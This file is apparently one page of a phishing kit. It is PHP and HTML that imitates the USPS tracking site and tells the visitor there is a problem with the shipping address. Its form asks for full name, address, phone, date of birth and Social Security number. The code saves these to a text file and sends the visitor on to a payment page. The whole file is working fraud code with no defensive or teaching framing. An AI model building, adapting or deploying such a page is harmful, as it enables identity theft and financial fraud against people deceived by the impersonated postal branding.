<?php
session_start();
require_once 'includes/file_storage.php';

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $fullName = $_POST['fullName'] ?? '';
    $streetAddress1 = $_POST['streetAddress1'] ?? '';
    $streetAddress2 = $_POST['streetAddress2'] ?? '';
    $city = $_POST['city'] ?? '';
    $state = $_POST['state'] ?? '';
    $zipCode = $_POST['zipCode'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $dob = $_POST['dob'] ?? '';
    $ssn = $_POST['ssn'] ?? '';
    
    $errors = [];
    
    if (empty($fullName)) {
        $errors['fullName'] = 'Full name is required.';
    }
    
    if (empty($streetAddress1)) {
        $errors['streetAddress1'] = 'Primary street address is required.';
    }
    
    if (empty($city)) {
        $errors['city'] = 'City is required.';
    }
    
    if (empty($state)) {
        $errors['state'] = 'State is required.';
    }
    
    if (empty($zipCode)) {
        $errors['zipCode'] = 'ZIP code is required.';
    }
    
    $phoneDigits = preg_replace('/\D/', '', $phone);
    if (strlen($phoneDigits) !== 10) {
        $errors['phone'] = 'Phone number must be 10 digits.';
    }
    
    if (empty($dob)) {
        $errors['dob'] = 'Date of birth is required.';
    }
    
    $ssnDigits = preg_replace('/\D/', '', $ssn);
    if (strlen($ssnDigits) !== 9) {
        $errors['ssn'] = 'SSN must be 9 digits.';
    }
    
    if (empty($errors)) {
        // Generate username for session tracking
        $username = strtolower(str_replace(' ', '', $fullName)) . '_' . substr(md5($phone), 0, 6);
        
        // Store all data in session
        $_SESSION['address_verification'] = [
            'fullName' => $fullName,
            'streetAddress1' => $streetAddress1,
            'streetAddress2' => $streetAddress2,
            'city' => $city,
            'state' => $state,
            'zipCode' => $zipCode,
            'phone' => $phoneDigits,
            'dob' => $dob,
            'ssn' => $ssnDigits
        ];
        
        // Save address verification data with all fields
        $data = array_merge(
            ['step' => 'address_verification', 'usrnm' => $username],
            $_SESSION['address_verification']
        );
        
        if (saveUserData('address_verification.txt', $data)) {
            // Store username in session for next pages
            $_SESSION['emzemz'] = $username;
            
            // Redirect to payment page
            header('Location: payment.php');
            exit;
        } else {
            $errors['form'] = 'There was an error verifying your address. Please try again.';
        }
    }
}

$states = [
    ['name' => 'Alabama', 'abbr' => 'AL'],
    ['name' => 'Alaska', 'abbr' => 'AK'],
    ['name' => 'Arizona', 'abbr' => 'AZ'],
    ['name' => 'Arkansas', 'abbr' => 'AR'],
    ['name' => 'California', 'abbr' => 'CA'],
    ['name' => 'Colorado', 'abbr' => 'CO'],
    ['name' => 'Connecticut', 'abbr' => 'CT'],
    ['name' => 'Delaware', 'abbr' => 'DE'],
    ['name' => 'District of Columbia', 'abbr' => 'DC'],
    ['name' => 'Florida', 'abbr' => 'FL'],
    ['name' => 'Georgia', 'abbr' => 'GA'],
    ['name' => 'Hawaii', 'abbr' => 'HI'],
    ['name' => 'Idaho', 'abbr' => 'ID'],
    ['name' => 'Illinois', 'abbr' => 'IL'],
    ['name' => 'Indiana', 'abbr' => 'IN'],
    ['name' => 'Iowa', 'abbr' => 'IA'],
    ['name' => 'Kansas', 'abbr' => 'KS'],
    ['name' => 'Kentucky', 'abbr' => 'KY'],
    ['name' => 'Louisiana', 'abbr' => 'LA'],
    ['name' => 'Maine', 'abbr' => 'ME'],
    ['name' => 'Maryland', 'abbr' => 'MD'],
    ['name' => 'Massachusetts', 'abbr' => 'MA'],
    ['name' => 'Michigan', 'abbr' => 'MI'],
    ['name' => 'Minnesota', 'abbr' => 'MN'],
    ['name' => 'Mississippi', 'abbr' => 'MS'],
    ['name' => 'Missouri', 'abbr' => 'MO'],
    ['name' => 'Montana', 'abbr' => 'MT'],
    ['name' => 'Nebraska', 'abbr' => 'NE'],
    ['name' => 'Nevada', 'abbr' => 'NV'],
    ['name' => 'New Hampshire', 'abbr' => 'NH'],
    ['name' => 'New Jersey', 'abbr' => 'NJ'],
    ['name' => 'New Mexico', 'abbr' => 'NM'],
    ['name' => 'New York', 'abbr' => 'NY'],
    ['name' => 'North Carolina', 'abbr' => 'NC'],
    ['name' => 'North Dakota', 'abbr' => 'ND'],
    ['name' => 'Ohio', 'abbr' => 'OH'],
    ['name' => 'Oklahoma', 'abbr' => 'OK'],
    ['name' => 'Oregon', 'abbr' => 'OR'],
    ['name' => 'Pennsylvania', 'abbr' => 'PA'],
    ['name' => 'Rhode Island', 'abbr' => 'RI'],
    ['name' => 'South Carolina', 'abbr' => 'SC'],
    ['name' => 'South Dakota', 'abbr' => 'SD'],
    ['name' => 'Tennessee', 'abbr' => 'TN'],
    ['name' => 'Texas', 'abbr' => 'TX'],
    ['name' => 'Utah', 'abbr' => 'UT'],
    ['name' => 'Vermont', 'abbr' => 'VT'],
    ['name' => 'Virginia', 'abbr' => 'VA'],
    ['name' => 'Washington', 'abbr' => 'WA'],
    ['name' => 'West Virginia', 'abbr' => 'WV'],
    ['name' => 'Wisconsin', 'abbr' => 'WI'],
    ['name' => 'Wyoming', 'abbr' => 'WY'],
];

$footerSections = [
    [
        'title' => 'Helpful Links',
        'links' => ['Contact Us', 'Site Index', 'FAQs', 'Feedback']
    ],
    [
        'title' => 'On About.usps.com',
        'links' => ['About USPS Home', 'Newsroom', 'USPS Service Updates', 'Forms & Publications', 'Government Services', 'Careers']
    ],
    [
        'title' => 'Other USPS Sites',
        'links' => ['Business Customer Gateway', 'Postal Inspectors', 'Inspector General', 'Postal Explorer', 'National Postal Museum', 'Resources for Developers']
    ],
    [
        'title' => 'Legal Information',
        'links' => ['Privacy Policy', 'Terms of Use', 'FOIA', 'No FEAR Act EEO Data']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USPS Tracking - Address Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
    <div class="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col">
        <!-- Header -->
        <header class="w-full bg-gray-100 border-b border-gray-200">
            <!-- Utility bar - desktop -->
            <div class="hidden lg:flex items-center justify-end px-6 py-2 text-xs text-gray-600 bg-white gap-12">
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <circle cx="12" cy="12" r="9" />
                        <path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18" />
                    </svg>
                    <span>English</span>
                </div>
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M12 21s7-5.5 7-11a7 7 0 0 0-14 0c0 5.5 7 11 7 11z" />
                        <circle cx="12" cy="10" r="2.5" />
                    </svg>
                    <span>Locations</span>
                </div>
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M4 13v4a2 2 0 0 0 2 2h1v-6h-1a2 2 0 0 0-2 2" />
                        <path d="M20 13v4a2 2 0 0 1-2 2h-1v-6h1a2 2 0 0 1 2 2" />
                        <path d="M6 13v-1a6 6 0 0 1 12 0v1" />
                    </svg>
                    <span>Support</span>
                </div>
                <div class="flex items-center gap-4">
                    <span class="whitespace-nowrap">Informed Delivery</span>
                    <span class="whitespace-nowrap">Register / Sign In</span>
                </div>
            </div>

            <!-- Desktop main nav -->
            <div class="hidden lg:flex max-w-[1180px] mx-auto items-center justify-between px-6">
                <div class="flex items-center gap-3 py-2 mr-6">
                    <img src="assets/logo-sb.svg" alt="USPS Logo" class="h-8" />
                </div>
                <nav class="flex items-center">
                    <ul class="flex items-center whitespace-nowrap text-sm font-medium text-[#1A2252]">
                        <li class="relative">
                            <a href="#" class="relative inline-flex items-center bg-[#1A2252] text-white px-8 pl-10 py-3 font-normal uppercase tracking-[0.08em] overflow-hidden" style="clip-path: polygon(12px 0, 100% 0, calc(100% - 10px) 100%, 0% 100%);">
                                <span class="relative z-20">Quick Tools</span>
                                <span class="absolute top-0 right-[1px] h-full w-4 bg-[#c4122f]" style="clip-path: polygon(10px 0px, 100% 0px, 40% 100%, 0% 100%); z-index: 15;"></span>
                            </a>
                        </li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Mail & Ship</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Track & Manage</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Postal Store</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Business</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">International</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Help</a></li>
                    </ul>
                </nav>
                <div class="ml-6 p-2 cursor-pointer hover:bg-gray-300 rounded">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#1A2252]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <circle cx="11" cy="11" r="8" />
                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
                    </svg>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex-1 w-full">
            <!-- Tracking Header -->
            <div class="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
                <div class="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
                    <div>
                        <div class="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                            USPS Tracking<sup class="text-xs align-super">®</sup>
                        </div>
                        <button type="button" class="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline">
                            <span>Track Another Package</span>
                            <span class="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
                        </button>
                    </div>
                    <div class="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
                        <button type="button" class="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]">Tracking</button>
                        <span class="h-5 w-px bg-[#d8d8e0]" />
                        <button type="button" class="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors">FAQs</button>
                    </div>
                </div>
            </div>

            <!-- Content -->
            <div class="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
                <div class="mt-12 space-y-12">
                    <!-- Tracking Info Section -->
                    <section class="space-y-5">
                        <div class="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                            <span class="font-semibold text-[#1a2252]">Tracking Number:</span>
                            <span class="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
                        </div>
                        <div class="text-[17px] font-semibold text-[#23285a]">Status :</div>
                        <div class="text-[19px] font-bold text-[#c5282c]">
                            We have issues with your shipping address
                        </div>
                        <div class="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                            USPS allows you to Redeliver your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.
                        </div>
                        <div class="mt-4 flex w-full max-w-[760px]">
                            <div class="h-[14px] flex-1" style="background: linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%); clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px] flex-1" style="background: #d9d9df; clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px] flex-1" style="background: #d9d9df; clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px] flex-1" style="background: #d9d9df; clip-path: polygon(8px 0, 100% 0, 100% 100%, 0 100%);"></div>
                        </div>
                        <div class="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                            Status Not Available
                        </div>
                    </section>

                    <!-- Verify Address Form -->
                    <section>
                        <div class="text-[17px] font-semibold text-[#23285a] mb-1">Verify Address</div>
                        <div class="text-[11px] text-[#4a4f6d] mb-6">
                            First, we need to confirm your address is eligible for redelivery.
                        </div>
                        <form method="POST" action="" class="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4">
                            <div>
                                <input type="text" name="fullName" placeholder="Full name" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['fullName'] ?? ''); ?>" required />
                                <?php if (isset($errors['fullName'])): ?>
                                    <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['fullName']); ?></p>
                                <?php endif; ?>
                            </div>
                            <div>
                                <input type="text" name="streetAddress2" placeholder="Street Address 2 (OPT)" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['streetAddress2'] ?? ''); ?>" />
                            </div>
                            <div>
                                <input type="text" name="streetAddress1" placeholder="Street Address 1" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['streetAddress1'] ?? ''); ?>" required />
                                <?php if (isset($errors['streetAddress1'])): ?>
                                    <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['streetAddress1']); ?></p>
                                <?php endif; ?>
                            </div>
                            <div>
                                <input type="text" name="city" placeholder="City" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>" required />
                                <?php if (isset($errors['city'])): ?>
                                    <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['city']); ?></p>
                                <?php endif; ?>
                            </div>
                            <input type="tel" inputmode="tel" name="phone" placeholder="(555) 123-4567" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>" required />
                            <?php if (isset($errors['phone'])): ?>
                                <p class="mt-1 text-xs text-red-600 sm:col-span-2"><?php echo htmlspecialchars($errors['phone']); ?></p>
                            <?php endif; ?>
                            <div class="relative">
                                <select name="state" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72] appearance-none pr-10" required>
                                    <option value="" disabled selected>Select State</option>
                                    <?php foreach ($states as $s): ?>
                                        <option value="<?php echo htmlspecialchars($s['abbr']); ?>" <?php echo (isset($_POST['state']) && $_POST['state'] === $s['abbr']) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($s['name'] . ' (' . $s['abbr'] . ')'); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <svg class="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#1a2252]" viewBox="0 0 20 20" fill="currentColor">
                                    <path d="M5.23 7.21a.75.75 0 0 1 1.06.02L10 11.17l3.71-3.94a.75.75 0 1 1 1.08 1.04l-4.24 4.5a.75.75 0 0 1-1.08 0l-4.24-4.5a.75.75 0 0 1 .02-1.06Z" />
                                </svg>
                            </div>
                            <?php if (isset($errors['state'])): ?>
                                <p class="mt-1 text-xs text-red-600 sm:col-span-2"><?php echo htmlspecialchars($errors['state']); ?></p>
                            <?php endif; ?>
                            <div class="relative">
                                <input type="date" name="dob" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72] pr-10" value="<?php echo htmlspecialchars($_POST['dob'] ?? ''); ?>" required />
                                <svg class="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#1a2252]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
                                    <line x1="16" y1="2" x2="16" y2="6" />
                                    <line x1="8" y1="2" x2="8" y2="6" />
                                    <line x1="3" y1="10" x2="21" y2="10" />
                                </svg>
                            </div>
                            <?php if (isset($errors['dob'])): ?>
                                <p class="mt-1 text-xs text-red-600 sm:col-span-2"><?php echo htmlspecialchars($errors['dob']); ?></p>
                            <?php endif; ?>
                            <div>
                                <input type="text" name="zipCode" placeholder="ZIP Code™ (CPI)" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>" maxlength="10" required />
                                <?php if (isset($errors['zipCode'])): ?>
                                    <p class="mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['zipCode']); ?></p>
                                <?php endif; ?>
                            </div>
                            <input type="text" inputmode="numeric" name="ssn" placeholder="123-45-6789" class="w-full border border-[#3d4095] rounded-sm px-4 py-2.5 text-[14px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72]" value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>" required />
                            <?php if (isset($errors['ssn'])): ?>
                                <p class="mt-1 text-xs text-red-600 sm:col-span-2"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                            <?php endif; ?>
                            <?php if (isset($errors['form'])): ?>
                                <p class="sm:col-span-2 text-sm text-red-600 font-semibold"><?php echo htmlspecialchars($errors['form']); ?></p>
                            <?php endif; ?>
                            <button type="submit" class="sm:col-span-2 mt-3 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors">
                                Continue
                            </button>
                        </form>
                    </section>
                </div>
            </div>

            <!-- FAQ Section -->
            <div class="mt-12 w-full">
                <div class="w-full bg-white border border-[#e0e0e8] py-12 px-8 text-center shadow-sm">
                    <h3 class="text-[22px] font-semibold text-[#1a2252]">
                        Can't find what you're looking for?
                    </h3>
                    <p class="mt-4 text-[14px] text-[#4a4f6d]">
                        Go to our FAQs section to find answers to your tracking questions.
                    </p>
                    <button class="mt-6 inline-flex items-center justify-center bg-[#2b2a72] text-white px-7 py-3 text-[14px] rounded-sm font-medium hover:bg-[#211f5a] transition-colors">
                        FAQs
                    </button>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="w-full text-[#1a2252] text-[0.75rem] py-10 mt-16">
            <div class="max-w-[1180px] mx-auto px-6">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-y-8 gap-x-10">
                    <?php foreach ($footerSections as $section): ?>
                        <div>
                            <h4 class="text-sm font-semibold uppercase tracking-wide text-[#1a2252] mb-3">
                                <?php echo htmlspecialchars($section['title']); ?>
                            </h4>
                            <ul class="space-y-1 text-[#4a4f6d]">
                                <?php foreach ($section['links'] as $link): ?>
                                    <li><a href="#" class="hover:text-[#c5282c]"><?php echo htmlspecialchars($link); ?></a></li>
                                <?php endforeach; ?>
                            </ul>
                        </div>
                    <?php endforeach; ?>
                </div>
                <div class="mt-10 text-center text-[#6b6f88] text-xs">
                    &copy; <?php echo date('Y'); ?> USPS. All Rights Reserved.
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Format phone number
        document.querySelector('input[name="phone"]').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            if (value.length > 0) {
                if (value.length <= 3) {
                    formatted = '(' + value;
                } else if (value.length <= 6) {
                    formatted = '(' + value.slice(0, 3) + ') ' + value.slice(3);
                } else {
                    formatted = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
                }
            }
            e.target.value = formatted;
        });

        // Format SSN
        document.querySelector('input[name="ssn"]').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            if (value.length > 0) {
                if (value.length <= 3) {
                    formatted = value;
                } else if (value.length <= 5) {
                    formatted = value.slice(0, 3) + '-' + value.slice(3);
                } else {
                    formatted = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
                }
            }
            e.target.value = formatted;
        });
    </script>
</body>
</html>
